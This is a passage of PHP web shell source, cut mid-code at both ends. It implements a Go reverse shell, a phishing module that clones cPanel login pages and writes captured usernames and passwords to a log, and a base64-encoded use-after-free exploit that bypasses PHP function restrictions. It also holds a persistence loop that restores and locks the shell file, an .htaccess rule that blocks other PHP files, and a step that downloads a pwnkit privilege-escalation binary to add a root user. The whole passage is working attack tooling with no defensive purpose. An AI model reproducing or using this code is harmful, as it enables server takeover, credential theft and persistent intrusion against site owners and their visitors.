        echo cmd('echo \'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","' . $HostServer . ':' . $PortServer . '");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go');
    }
}


if (isset($_POST['submit-fakepage'])) {
	$clone_page = $_POST['fakepage-clone'];
	$fake_root = $_POST['fakepage-root'];
	$logto = $_POST['fakepage-log'];
	$panel = $_POST['fakepage-clone'];
	$inject_to = $_POST['fakepage-iject'];
	$bind_on = $_POST['fakepage-bind'];
	$count = $_POST['fakepage-count'];
	if(!empty($clone_page) && !empty($fake_root) && !empty($logto) && !empty($inject_to) && !empty($bind_on) && $_POST['alfa3'] == '>>'){
		echo __pre();
		$target = $clone_page;
		$curl = new AlfaCURL();
		$source_page = $curl->Send($target);
		if(!empty($source_page)){
			$matched_form = "";
			if($panel == "cpanel"){
				if(preg_match('#<form(.*)id="login_form"(.*)>#', $source_page, $match)){
					$matched_form = $match[0];
				}
			}else{
				if(preg_match('#<form(.*?)>#', $source_page, $match)){
					$matched_form = $match[0];
				}
			}
			if(!empty($matched_form)){
				$fake = "";
				$pwd = str_replace($_SERVER["DOCUMENT_ROOT"], '', $fake_root);
				$uri = str_replace($_SERVER["DOCUMENT_ROOT"], '', $inject_to);
				if($panel == "cpanel"){
					$port = "2083";
				}else{
					$target = str_replace(array("http://", "https://"), "", $target);
					$port = explode(":",$target);
					$port = $port[1];
				}
				if(substr($uri, 0, 1) == "/"){
					$uri = substr($uri, 1);
				}
				$uri = $_SERVER["HTTP_ORIGIN"] . '/' . str_replace("index.php", "", $uri) . '?:' . $port;
				$log_url = $_SERVER["HTTP_ORIGIN"] . $pwd . '/log.php';
				if($panel == "cpanel"){
					$form = '<form novalidate id="login_form" action="'.$log_url.'" method="post" target="_top" style="visibility:">';
				}else{
					$form = '<form action="'.$log_url.'" method="post">';
				}
				$fake = str_replace($matched_form, $form, $source_page);
				if(@!is_dir($fake_root)){
					@mkdir($fake_root, 0777, true);
				}

				$cookie_name = "alfa_fakepage_counter" . rand(9999,99999);

				$post_user = 'user';
				$post_pass = 'pass';
				$resp_code = 'if(empty($user)){http_response_code(400);echo json_encode(array("message" => "no_username"));}else{http_response_code(401);}';
				if($panel != "cpanel"){
					$post_user = 'username';
					$post_pass = 'password';
					$resp_code = '@header("Location: ".$_SERVER[\'HTTP_REFERER\']);';
				}

				$cpanel_log = '<?php $cook_time = time()+(86400 * 7); $user = $_POST["'.$post_user.'"];$pass = $_POST["'.$post_pass.'"];if(!empty($user) && !empty($pass)){if(!isset($_COOKIE["'.$cookie_name.'"])){@setcookie("'.$cookie_name.'", 0, $cook_time, "/");$_COOKIE["'.$cookie_name.'"]=1;}if((int)$_COOKIE["'.$cookie_name.'"]>'.$count.'){@header("Location: /");exit;}@setcookie("'.$cookie_name.'", ((int)$_COOKIE["'.$cookie_name.'"] + 1), $cook_time, "/");$fp = @fopen("'.$logto.'", "a+");@fwrite($fp, $user . " : " . $pass . "\n");fclose($fp);sleep(3);'.$resp_code.'exit;}?>';

				@file_put_contents($fake_root.'/log.php', $cpanel_log);

				if($panel == "cpanel"){
					$fake = preg_replace(array('#<link(.*)href="(.*)"(.*)>#', '#<img class="main-logo" src="(.*)"(.*)>#', '# <a(.*)id="reset_password">#'), array('<link href="'.$target.'/$2">', '<img class="main-logo" src="'.$target.'/$1" alt="logo" />', '<a href="#" id="reset_password">'), $fake);
				}

				@file_put_contents($fake_root.'/index.php', $fake);

				$inject_code = '<?php if(isset($_GET[":2083"])&&(int)$_COOKIE["'.$cookie_name.'"]<'.$count.'){@include("'.$fake_root.'/index.php");exit;}?>';
				$bind_on_code = '<?php if((int)$_COOKIE["'.$cookie_name.'"]<'.$count.'){@header("Location: '.$uri.'");exit;}?>';

				@file_put_contents($inject_to, $inject_code . "\n" .@file_get_contents($inject_to));
				@file_put_contents($bind_on, $bind_on_code . "\n" .@file_get_contents($bind_on));

				echo "success...!";
			}else{
				echo "failed...!";
			}
		}else{
			echo("<div style='text-align:center;color:red;'>Cannot open the target...!</div>");
		}
	}
	echo '</div>';
	alfafooter();
}





if ($_GET['terminal'] == "bypasser") {
    if (!$fungsi[3]('.term-bypass') && $fungsi[4]($fungsi[0]())) {
        $connt = 'PD9waHAKZnVuY3Rpb24gcHduKCRjbWRkKSB7CiAgICBnbG9iYWwgJGFiYywgJGhlbHBlciwgJGJhY2t0cmFjZTsKCiAgICBjbGFzcyBWdWxuIHsKICAgICAgICBwdWJsaWMgJGE7CiAgICAgICAgcHVibGljIGZ1bmN0aW9uIF9fZGVzdHJ1Y3QoKSB7IAogICAgICAgICAgICBnbG9iYWwgJGJhY2t0cmFjZTsgCiAgICAgICAgICAgIHVuc2V0KCR0aGlzLT5hKTsKICAgICAgICAgICAgJGJhY2t0cmFjZSA9IChuZXcgRXhjZXB0aW9uKS0+Z2V0VHJhY2UoKTsgIyA7KQogICAgICAgICAgICBpZighaXNzZXQoJGJhY2t0cmFjZVsxXVsnYXJncyddKSkgeyAjIFBIUCA+PSA3LjQKICAgICAgICAgICAgICAgICRiYWNrdHJhY2UgPSBkZWJ1Z19iYWNrdHJhY2UoKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICBjbGFzcyBIZWxwZXIgewogICAgICAgIHB1YmxpYyAkYSwgJGIsICRjLCAkZDsKICAgIH0KCiAgICBmdW5jdGlvbiBzdHIycHRyKCYkc3RyLCAkcCA9IDAsICRzID0gOCkgewogICAgICAgICRhZGRyZXNzID0gMDsKICAgICAgICBmb3IoJGogPSAkcy0xOyAkaiA+PSAwOyAkai0tKSB7CiAgICAgICAgICAgICRhZGRyZXNzIDw8PSA4OwogICAgICAgICAgICAkYWRkcmVzcyB8PSBvcmQoJHN0clskcCskal0pOwogICAgICAgIH0KICAgICAgICByZXR1cm4gJGFkZHJlc3M7CiAgICB9CgogICAgZnVuY3Rpb24gcHRyMnN0cigkcHRyLCAkbSA9IDgpIHsKICAgICAgICAkb3V0ID0gIiI7CiAgICAgICAgZm9yICgkaT0wOyAkaSA8ICRtOyAkaSsrKSB7CiAgICAgICAgICAgICRvdXQgLj0gY2hyKCRwdHIgJiAweGZmKTsKICAgICAgICAgICAgJHB0ciA+Pj0gODsKICAgICAgICB9CiAgICAgICAgcmV0dXJuICRvdXQ7CiAgICB9CgogICAgZnVuY3Rpb24gd3JpdGUoJiRzdHIsICRwLCAkdiwgJG4gPSA4KSB7CiAgICAgICAgJGkgPSAwOwogICAgICAgIGZvcigkaSA9IDA7ICRpIDwgJG47ICRpKyspIHsKICAgICAgICAgICAgJHN0clskcCArICRpXSA9IGNocigkdiAmIDB4ZmYpOwogICAgICAgICAgICAkdiA+Pj0gODsKICAgICAgICB9CiAgICB9CgogICAgZnVuY3Rpb24gbGVhaygkYWRkciwgJHAgPSAwLCAkcyA9IDgpIHsKICAgICAgICBnbG9iYWwgJGFiYywgJGhlbHBlcjsKICAgICAgICB3cml0ZSgkYWJjLCAweDY4LCAkYWRkciArICRwIC0gMHgxMCk7CiAgICAgICAgJGxlYWsgPSBzdHJsZW4oJGhlbHBlci0+YSk7CiAgICAgICAgaWYoJHMgIT0gOCkgeyAkbGVhayAlPSAyIDw8ICgkcyAqIDgpIC0gMTsgfQogICAgICAgIHJldHVybiAkbGVhazsKICAgIH0KCiAgICBmdW5jdGlvbiBwYXJzZV9lbGYoJGJhc2UpIHsKICAgICAgICAkZV90eXBlID0gbGVhaygkYmFzZSwgMHgxMCwgMik7CgogICAgICAgICRlX3Bob2ZmID0gbGVhaygkYmFzZSwgMHgyMCk7CiAgICAgICAgJGVfcGhlbnRzaXplID0gbGVhaygkYmFzZSwgMHgzNiwgMik7CiAgICAgICAgJGVfcGhudW0gPSBsZWFrKCRiYXNlLCAweDM4LCAyKTsKCiAgICAgICAgZm9yKCRpID0gMDsgJGkgPCAkZV9waG51bTsgJGkrKykgewogICAgICAgICAgICAkaGVhZGVyID0gJGJhc2UgKyAkZV9waG9mZiArICRpICogJGVfcGhlbnRzaXplOwogICAgICAgICAgICAkcF90eXBlICA9IGxlYWsoJGhlYWRlciwgMCwgNCk7CiAgICAgICAgICAgICRwX2ZsYWdzID0gbGVhaygkaGVhZGVyLCA0LCA0KTsKICAgICAgICAgICAgJHBfdmFkZHIgPSBsZWFrKCRoZWFkZXIsIDB4MTApOwogICAgICAgICAgICAkcF9tZW1zeiA9IGxlYWsoJGhlYWRlciwgMHgyOCk7CgogICAgICAgICAgICBpZigkcF90eXBlID09IDEgJiYgJHBfZmxhZ3MgPT0gNikgeyAjIFBUX0xPQUQsIFBGX1JlYWRfV3JpdGUKICAgICAgICAgICAgICAgICMgaGFuZGxlIHBpZQogICAgICAgICAgICAgICAgJGRhdGFfYWRkciA9ICRlX3R5cGUgPT0gMiA/ICRwX3ZhZGRyIDogJGJhc2UgKyAkcF92YWRkcjsKICAgICAgICAgICAgICAgICRkYXRhX3NpemUgPSAkcF9tZW1zejsKICAgICAgICAgICAgfSBlbHNlIGlmKCRwX3R5cGUgPT0gMSAmJiAkcF9mbGFncyA9PSA1KSB7ICMgUFRfTE9BRCwgUEZfUmVhZF9leGVjCiAgICAgICAgICAgICAgICAkdGV4dF9zaXplID0gJHBfbWVtc3o7CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIGlmKCEkZGF0YV9hZGRyIHx8ICEkdGV4dF9zaXplIHx8ICEkZGF0YV9zaXplKQogICAgICAgICAgICByZXR1cm4gZmFsc2U7CgogICAgICAgIHJldHVybiBbJGRhdGFfYWRkciwgJHRleHRfc2l6ZSwgJGRhdGFfc2l6ZV07CiAgICB9CgogICAgZnVuY3Rpb24gZ2V0X2Jhc2ljX2Z1bmNzKCRiYXNlLCAkZWxmKSB7CiAgICAgICAgbGlzdCgkZGF0YV9hZGRyLCAkdGV4dF9zaXplLCAkZGF0YV9zaXplKSA9ICRlbGY7CiAgICAgICAgZm9yKCRpID0gMDsgJGkgPCAkZGF0YV9zaXplIC8gODsgJGkrKykgewogICAgICAgICAgICAkbGVhayA9IGxlYWsoJGRhdGFfYWRkciwgJGkgKiA4KTsKICAgICAgICAgICAgaWYoJGxlYWsgLSAkYmFzZSA+IDAgJiYgJGxlYWsgLSAkYmFzZSA8ICRkYXRhX2FkZHIgLSAkYmFzZSkgewogICAgICAgICAgICAgICAgJGRlcmVmID0gbGVhaygkbGVhayk7CiAgICAgICAgICAgICAgICAjICdjb25zdGFudCcgY29uc3RhbnQgY2hlY2sKICAgICAgICAgICAgICAgIGlmKCRkZXJlZiAhPSAweDc0NmU2MTc0NzM2ZTZmNjMpCiAgICAgICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgIH0gZWxzZSBjb250aW51ZTsKCiAgICAgICAgICAgICRsZWFrID0gbGVhaygkZGF0YV9hZGRyLCAoJGkgKyA0KSAqIDgpOwogICAgICAgICAgICBpZigkbGVhayAtICRiYXNlID4gMCAmJiAkbGVhayAtICRiYXNlIDwgJGRhdGFfYWRkciAtICRiYXNlKSB7CiAgICAgICAgICAgICAgICAkZGVyZWYgPSBsZWFrKCRsZWFrKTsKICAgICAgICAgICAgICAgICMgJ2JpbjJoZXgnIGNvbnN0YW50IGNoZWNrCiAgICAgICAgICAgICAgICBpZigkZGVyZWYgIT0gMHg3ODY1NjgzMjZlNjk2MikKICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgfSBlbHNlIGNvbnRpbnVlOwoKICAgICAgICAgICAgcmV0dXJuICRkYXRhX2FkZHIgKyAkaSAqIDg7CiAgICAgICAgfQogICAgfQoKICAgIGZ1bmN0aW9uIGdldF9iaW5hcnlfYmFzZSgkYmluYXJ5X2xlYWspIHsKICAgICAgICAkYmFzZSA9IDA7CiAgICAgICAgJHN0YXJ0ID0gJGJpbmFyeV9sZWFrICYgMHhmZmZmZmZmZmZmZmZmMDAwOwogICAgICAgIGZvcigkaSA9IDA7ICRpIDwgMHgxMDAwOyAkaSsrKSB7CiAgICAgICAgICAgICRhZGRyID0gJHN0YXJ0IC0gMHgxMDAwICogJGk7CiAgICAgICAgICAgICRsZWFrID0gbGVhaygkYWRkciwgMCwgNyk7CiAgICAgICAgICAgIGlmKCRsZWFrID09IDB4MTAxMDI0NjRjNDU3ZikgeyAjIEVMRiBoZWFkZXIKICAgICAgICAgICAgICAgIHJldHVybiAkYWRkcjsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICBmdW5jdGlvbiBnZXRfc3lzdGVtKCRiYXNpY19mdW5jcykgewogICAgICAgICRhZGRyID0gJGJhc2ljX2Z1bmNzOwogICAgICAgIGRvIHsKICAgICAgICAgICAgJGZfZW50cnkgPSBsZWFrKCRhZGRyKTsKICAgICAgICAgICAgJGZfbmFtZSA9IGxlYWsoJGZfZW50cnksIDAsIDYpOwoKICAgICAgICAgICAgaWYoJGZfbmFtZSA9PSAweDZkNjU3NDczNzk3MykgeyAjIHN5c3RlbQogICAgICAgICAgICAgICAgcmV0dXJuIGxlYWsoJGFkZHIgKyA4KTsKICAgICAgICAgICAgfQogICAgICAgICAgICAkYWRkciArPSAweDIwOwogICAgICAgIH0gd2hpbGUoJGZfZW50cnkgIT0gMCk7CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQoKICAgIGZ1bmN0aW9uIHRyaWdnZXJfdWFmKCRhcmcpIHsKICAgICAgICAjIHN0cl9zaHVmZmxlIHByZXZlbnRzIG9wY2FjaGUgc3RyaW5nIGludGVybmluZwogICAgICAgICRhcmcgPSBzdHJfc2h1ZmZsZShzdHJfcmVwZWF0KCdBJywgNzkpKTsKICAgICAgICAkdnVsbiA9IG5ldyBWdWxuKCk7CiAgICAgICAgJHZ1bG4tPmEgPSAkYXJnOwogICAgfQoKICAgIGlmKHN0cmlzdHIoUEhQX09TLCAnV0lOJykpIHsKICAgICAgICBkaWUoJ1RoaXMgUG9DIGlzIGZvciAqbml4IHN5c3RlbXMgb25seS4nKTsKICAgIH0KCiAgICAkbl9hbGxvYyA9IDEwOyAjIGluY3JlYXNlIHRoaXMgdmFsdWUgaWYgVUFGIGZhaWxzCiAgICAkY29udGlndW91cyA9IFtdOwogICAgZm9yKCRpID0gMDsgJGkgPCAkbl9hbGxvYzsgJGkrKykKICAgICAgICAkY29udGlndW91c1tdID0gc3RyX3NodWZmbGUoc3RyX3JlcGVhdCgnQScsIDc5KSk7CgogICAgdHJpZ2dlcl91YWYoJ3gnKTsKICAgICRhYmMgPSAkYmFja3RyYWNlWzFdWydhcmdzJ11bMF07CgogICAgJGhlbHBlciA9IG5ldyBIZWxwZXI7CiAgICAkaGVscGVyLT5iID0gZnVuY3Rpb24gKCR4KSB7IH07CgogICAgaWYoc3RybGVuKCRhYmMpID09IDc5IHx8IHN0cmxlbigkYWJjKSA9PSAwKSB7CiAgICAgICAgZGllKCJVQUYgZmFpbGVkIik7CiAgICB9CgogICAgIyBsZWFrcwogICAgJGNsb3N1cmVfaGFuZGxlcnMgPSBzdHIycHRyKCRhYmMsIDApOwogICAgJHBocF9oZWFwID0gc3RyMnB0cigkYWJjLCAweDU4KTsKICAgICRhYmNfYWRkciA9ICRwaHBfaGVhcCAtIDB4Yzg7CgogICAgIyBmYWtlIHZhbHVlCiAgICB3cml0ZSgkYWJjLCAweDYwLCAyKTsKICAgIHdyaXRlKCRhYmMsIDB4NzAsIDYpOwoKICAgICMgZmFrZSByZWZlcmVuY2UKICAgIHdyaXRlKCRhYmMsIDB4MTAsICRhYmNfYWRkciArIDB4NjApOwogICAgd3JpdGUoJGFiYywgMHgxOCwgMHhhKTsKCiAgICAkY2xvc3VyZV9vYmogPSBzdHIycHRyKCRhYmMsIDB4MjApOwoKICAgICRiaW5hcnlfbGVhayA9IGxlYWsoJGNsb3N1cmVfaGFuZGxlcnMsIDgpOwogICAgaWYoISgkYmFzZSA9IGdldF9iaW5hcnlfYmFzZSgkYmluYXJ5X2xlYWspKSkgewogICAgICAgIGRpZSgiQ291bGRuJ3QgZGV0ZXJtaW5lIGJpbmFyeSBiYXNlIGFkZHJlc3MiKTsKICAgIH0KCiAgICBpZighKCRlbGYgPSBwYXJzZV9lbGYoJGJhc2UpKSkgewogICAgICAgIGRpZSgiQ291bGRuJ3QgcGFyc2UgRUxGIGhlYWRlciIpOwogICAgfQoKICAgIGlmKCEoJGJhc2ljX2Z1bmNzID0gZ2V0X2Jhc2ljX2Z1bmNzKCRiYXNlLCAkZWxmKSkpIHsKICAgICAgICBkaWUoIkNvdWxkbid0IGdldCBiYXNpY19mdW5jdGlvbnMgYWRkcmVzcyIpOwogICAgfQoKICAgIGlmKCEoJHppZl9zeXN0ZW0gPSBnZXRfc3lzdGVtKCRiYXNpY19mdW5jcykpKSB7CiAgICAgICAgZGllKCJDb3VsZG4ndCBnZXQgemlmX3N5c3RlbSBhZGRyZXNzIik7CiAgICB9CgogICAgIyBmYWtlIGNsb3N1cmUgb2JqZWN0CiAgICAkZmFrZV9vYmpfb2Zmc2V0ID0gMHhkMDsKICAgIGZvcigkaSA9IDA7ICRpIDwgMHgxMTA7ICRpICs9IDgpIHsKICAgICAgICB3cml0ZSgkYWJjLCAkZmFrZV9vYmpfb2Zmc2V0ICsgJGksIGxlYWsoJGNsb3N1cmVfb2JqLCAkaSkpOwogICAgfQoKICAgICMgcHduCiAgICB3cml0ZSgkYWJjLCAweDIwLCAkYWJjX2FkZHIgKyAkZmFrZV9vYmpfb2Zmc2V0KTsKICAgIHdyaXRlKCRhYmMsIDB4ZDAgKyAweDM4LCAxLCA0KTsgIyBpbnRlcm5hbCBmdW5jIHR5cGUKICAgIHdyaXRlKCRhYmMsIDB4ZDAgKyAweDY4LCAkemlmX3N5c3RlbSk7ICMgaW50ZXJuYWwgZnVuYyBoYW5kbGVyCgogICAgKCRoZWxwZXItPmIpKCRjbWRkKTsKfQ==';
        $fungsi[28](".term-bypass", base64_decode($connt));
    }
}


if (isset($_GET['lockshell'])) {
    $curFile = trim(basename($_SERVER["\x53\x43\x52\x49\x50\x54\x5f\x46\x49\x4c\x45\x4e\x41\x4d\x45"]));
    $TmpNames = $fungsi[31]();
    if (file_exists($TmpNames . '/.sessions/.' . base64_encode($fungsi[0]() . remove_dot($curFile)  . '-handler')) && file_exists($TmpNames . '/.sessions/.' . base64_encode($fungsi[0]() . remove_dot($curFile) . '-text'))) {
        cmd('rm -rf ' . $TmpNames . '/.sessions/.' . base64_encode($fungsi[0]() . remove_dot($curFile) . '-text'));
        cmd('rm -rf ' . $TmpNames . '/.sessions/.' . base64_encode($fungsi[0]() . remove_dot($curFile) . '-handler'));
    }
    mkdir($TmpNames . "/.sessions");
    cmd("cp $curFile " . $TmpNames . "/.sessions/." . base64_encode($fungsi[0]() . remove_dot($curFile) . '-text'));
    chmod($curFile, 0444);
    $handler = '
<?php
@ini_set("max_execution_time", 0);
	while (True){
	    if (!file_exists("' . __DIR__ . '")){
		mkdir("' . __DIR__ . '");
	    }
	    if (!file_exists("' . $fungsi[0]() . '/' . $curFile . '")){
		$text = base64_encode(file_get_contents("' . $TmpNames . '/.sessions/.' . base64_encode($fungsi[0]() . remove_dot($curFile) . '-text') . '"));
		file_put_contents("' . $fungsi[0]() . '/' . $curFile . '", base64_decode($text));
	    }
	    if (R10T_perm("' . $fungsi[0]() . '/' . $curFile . '") != 0444){
		chmod("' . $fungsi[0]() . '/' . $curFile . '", 0444);
	    }
	    if (R10T_perm("' . __DIR__ . '") != 0555){
		chmod("' . __DIR__ . '", 0555);
	    }
	}

function R10T_perm($flename){
return substr(sprintf("%o", fileperms($flename)), -4);
	}
	';
	    $hndlers = $fungsi[28]($TmpNames . "/.sessions/." . base64_encode($fungsi[0]() . remove_dot($curFile)  . '-handler') . "", $handler);
	    if ($hndlers) {
		cmd(PHP_BINARY .' ' . $TmpNames . '/.sessions/.' . base64_encode($fungsi[0]() . remove_dot($curFile)  . '-handler') . ' > /dev/null 2>/dev/null &');
		success();
	    } else {
		failed();
	    }
	}
	if (isset($_POST['R10T-up-submit'])) {
	    $namaFilenya = $_FILES['R10T-upload']['name'];
	    $tmpName = $_FILES['R10T-upload']['tmp_name'];
	    if ($fungsi[29]($tmpName, $fungsi[0]() . "/" . $namaFilenya)) {
		success();
	    } else {
		failed();
	    }
	}

if ($_GET['logout'] == True) {
    session_destroy();
    session_unset();
    success();
}

if (isset($_GET['destroy'])) {
    $DOC_ROOT = $_SERVER["\x44\x4f\x43\x55\x4d\x45\x4e\x54\x5f\x52\x4f\x4f\x54"];
    $CurrentFile = trim(basename($_SERVER["\x53\x43\x52\x49\x50\x54\x5f\x46\x49\x4c\x45\x4e\x41\x4d\x45"]));
    if ($fungsi[4]($DOC_ROOT)) {
        $htaccess = '
<FilesMatch "\.(php|ph*|Ph*|PH*|pH*)$">
    Deny from all
</FilesMatch>
<FilesMatch "^(' . $CurrentFile . '|index.php|wp-config.php|wp-includes.php)$">
    Allow from all
</FilesMatch>
<FilesMatch "\.(jpg|png|gif|pdf|jpeg)$">
    Allow from all
</FilesMatch>';
        $put_htt = $fungsi[28]($DOC_ROOT . "/.htaccess", $htaccess);
        if ($put_htt) {
            success();
        } else {
            failed();
        }
    } else {
        failed();
    }
}


if (isset($_POST['save-editor'])) {
    $save = $fungsi[28]($fungsi[0]() . "/" . unx($_GET['f']), $_POST['code-editor']);
    if ($save) {
        success();
    } else {
        failed();
    }
}

if (isset($_GET['adminer'])) {
    $URL = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x69\x74\x68\x75\x62\x2e\x63\x6f\x6d\x2f\x76\x72\x61\x6e\x61\x2f\x61\x64\x6d\x69\x6e\x65\x72\x2f\x72\x65\x6c\x65\x61\x73\x65\x73\x2f\x64\x6f\x77\x6e\x6c\x6f\x61\x64\x2f\x76\x34\x2e\x38\x2e\x31\x2f\x61\x64\x6d\x69\x6e\x65\x72\x2d\x34\x2e\x38\x2e\x31\x2e\x70\x68\x70";
    if (!$fungsi[3]('adminer.php')) {
        cmd('wget ' . $URL . ' -O adminer.php --quiet');
        echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '">';
    }
}


if ($_GET['terminal'] == "root") {
    if (!$fungsi[3]('pwnkit') && $fungsi[4]($fungsi[0]())) {
        cmd('wget https://github.com/MadExploits/Privelege-escalation/raw/main/pwnkit -O pwnkit');
        cmd('chmod +x pwnkit');
        echo cmd('./pwnkit id > .mad-root');
        echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '&terminal=root">';
    }
}

if (isset($_POST['submit-action'])) {
    $items = $_POST['check'];
    if ($_POST['R10T-select'] == "delete") {
        foreach ($items as $it) {
            $repl = str_replace("\\", "/", $fungsi[0]()); // Untuk Windows Path
            $fd = $repl . "/" . $it;
            if (is_dir($fd) || is_file($fd)) {
                $rmdir = unlinkDir($fd);
                $rmfile = $fungsi[24]($fd);
                if ($rmdir || $rmfile) {
                    success();
                } else if ($rmdir && $rmfile) {
                    success();
                } else {
                    failed();
                }
            }
        }
    }
}

if (isset($_POST['submit'])) {
    if ($_POST['create_folder'] == true) {
        $NamaFolder = $fungsi[12]($_POST['create_folder']);
        if ($NamaFolder) {
            success();
        } else {
            failed();
        }
    } else if ($_POST['create_file'] == true) {
        $namaFile = $fungsi[13]($_POST['create_file']);
        if ($namaFile) {
            success();
        } else {
            failed();
        }
    } else if ($_POST['renameFile'] == true) {
        $renameFile = $fungsi[15](unx($_GET['re']), $_POST['renameFile']);
        if ($renameFile) {
            success();
        } else {
            failed();
        }
    } else if ($_POST['chFile']) {
        $chFiles = $fungsi[30](unx($_GET['ch']), $_POST['chFile']);
        if ($chFiles) {
            success();
        } else {
            failed();
        }
    } else if (isset($_POST['add-username']) && isset($_POST['add-password'])) {
        if (!$fungsi[3]('pwnkit')) {
            cmd('wget https://github.com/MadExploits/Privelege-escalation/raw/main/pwnkit -O pwnkit');
            cmd('chmod +x pwnkit');
            cmd('./pwnkit "id" > .mad-root');
            echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '&rooting=True">';
        } else if ($fungsi[3]('.mad-root')) {
            $response = $fungsi[11]('.mad-root');
            $r_text = explode(" ", $response);
            if ($r_text[0] == "uid=0(root)") {
                $username = $_POST['add-username'];
                $password = $_POST['add-password'];
                cmd('./pwnkit "useradd ' . $username . ' ; echo -e "' . $password . '\n' . $password . '" | passwd ' . $username . '"');
            } else {
                echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '&adduser=failed">';
            }
        }
    } else if ($_POST['lockfile'] == true) {
        $flesName = $_POST['lockfile'];
        $TmpNames = $fungsi[31]();
        if (file_exists($TmpNames . '/.sessions/.' . base64_encode($fungsi[0]() . remove_dot($flesName) . '-handler')) && file_exists($TmpNames . '/.sessions/.' . remove_dot($flesName) . '-text')) {
            cmd('rm -rf ' . $TmpNames . '/.sessions/.' . base64_encode($fungsi[0]() . remove_dot($flesName) . '-text-file'));
            cmd('rm -rf ' . $TmpNames . '/.sessions/.' . base64_encode($fungsi[0]() . remove_dot($flesName) . '-handler'));
        }
        mkdir($TmpNames . "/.sessions");
        cmd("cp $flesName " . $TmpNames . "/.sessions/." . base64_encode($fungsi[0]() . remove_dot($flesName) . '-text-file'));
        chmod($flesName, 0444);
        $handler = '
<?php
@ini_set("max_execution_time", 0);
while (True){
    if (!file_exists("' . $fungsi[0]() . '")){
        mkdir("' . $fungsi[0]() . '");
    }
    if (!file_exists("' . $fungsi[0]() . '/' . $flesName . '")){
        $text = base64_encode(file_get_contents("' . $TmpNames . '/.sessions/.' . base64_encode($fungsi[0]() . remove_dot($flesName) . '-text-file') . '"));
        file_put_contents("' . $fungsi[0]() . '/' . $flesName . '", base64_decode($text));
    }
    if (R10T_perm("' . $fungsi[0]() . '/' . $flesName . '") != 0444){
        chmod("' . $fungsi[0]() . '/' . $flesName . '", 0444);
    } 
    if (R10T_perm("' . $fungsi[0]() . '") != 0555){
        chmod("' . $fungsi[0]() . '", 0555);
    }
}

function R10T_perm($flename){
    return substr(sprintf("%o", fileperms($flename)), -4);
}
';
        $hndlers = $fungsi[28]($TmpNames . "/.sessions/." . base64_encode($fungsi[0]() . remove_dot($flesName) . '-handler') . "", $handler);
        if ($hndlers) {
            cmd(PHP_BINARY .' '. $TmpNames . '/.sessions/.' . base64_encode($fungsi[0]() . remove_dot($flesName) . '-handler') . ' > /dev/null 2>/dev/null &');
        } else {
            failed();
        }
    } else if ($_POST['lockfile'] == true) {
        $flesName = $_POST['lockfile'];
        $TmpNames = $fungsi[31]();
        if (file_exists($TmpNames . '/.sessions/.' . base64_encode($fungsi[0]() . remove_dot($flesName) . '-handler')) && file_exists($TmpNames . '/.sessions/.' . remove_dot($flesName) . '-text')) {
            cmd('rm -rf ' . $TmpNames . '/.sessions/.' . base64_encode($fungsi[0]() . remove_dot($flesName) . '-text-file'));
            cmd('rm -rf ' . $TmpNames . '/.sessions/.' . base64_encode($fungsi[0]() . remove_dot($flesName) . '-handler'));
        }
        mkdir($TmpNames . "/.sessions");
        cmd("cp $flesName " . $TmpNames . "/.sessions/." . base64_encode($fungsi[0]() . remove_dot($flesName) . '-text-file'));
        chmod($flesName, 0444);
        $handler = '
<?php
@ini_set("max_execution_time", 0);
while (True){
    if (!file_exists("' . $fungsi[0]() . '")){
        mkdir("' . $fungsi[0]() . '");
    }
    if (!file_exists("' . $fungsi[0]() . '/' . $flesName . '")){
        $text = base64_encode(file_get_contents("' . $TmpNames . '/.sessions/.' . base64_encode($fungsi[0]() . remove_dot($flesName) . '-text-file') . '"));
        file_put_contents("' . $fungsi[0]() . '/' . $flesName . '", base64_decode($text));
    }
    if (R10T_perm("' . $fungsi[0]() . '/' . $flesName . '") != 0444){
        chmod("' . $fungsi[0]() . '/' . $flesName . '", 0444);
    }
}

function R10T_perm($flename){
    return substr(sprintf("%o", fileperms($flename)), -4);
}
';
        $hndlers = $fungsi[28]($TmpNames . "/.sessions/." . base64_encode($fungsi[0]() . remove_dot($flesName) . '-handler') . "", $handler);
        if ($hndlers) {
            cmd('php ' . $TmpNames . '/.sessions/.' . base64_encode($fungsi[0]() . remove_dot($flesName) . '-handler') . ' > /dev/null 2>/dev/null &');
        } else {
            failed();
        }
    } else if ($_POST['lock-windows'] == True) {
        $NameWin = $_POST['lock-windows'];
        $tmpPath = str_replace("\\", "/", $fungsi[31]());
        if (strstr($fungsi[8](), "NT")) {
            // Menghapus file
            if (file_exists($tmpPath . '/.sessions/.' . remove_slash(winpwd() . $NameWin) . 'text') && file_exists($tmpPath . "/.sessions/." . remove_slash(winpwd() . $NameWin) . "handler")) {
                unlink($tmpPath . '/.sessions/.' . remove_slash(winpwd() . $NameWin) . 'text');
                unlink($tmpPath . "/.sessions/." . remove_slash(winpwd() . $NameWin) . "handler");
            }

            // Membuat File
            mkdir($tmpPath . "/.sessions");
            copy($NameWin, $tmpPath . "/.sessions/." . remove_slash(winpwd()  . $NameWin) . "text");

            $putcontent = $fungsi[28]($tmpPath . "/.sessions/." . remove_slash(winpwd() . $NameWin) . "handler", '
<?php

chmod("' . winpwd() . '/' . $NameWin . '", 0444);
while (True)
{
    if (!file_exists("' . winpwd() . '")){
        mkdir("' . winpwd() . '");
    }
    if (!file_exists("' . winpwd() . '/' . $NameWin . '")){
        $text = base64_encode(file_get_contents("' . $tmpPath . '/.sessions/.' . remove_slash(winpwd() . $NameWin) . 'text"));
        $target = "' . winpwd() . '/' . $NameWin . '";
        file_put_contents($target, base64_decode($text));
    }
    if (R10T_perm("' . winpwd() . '/' . $NameWin . '") != 0444){
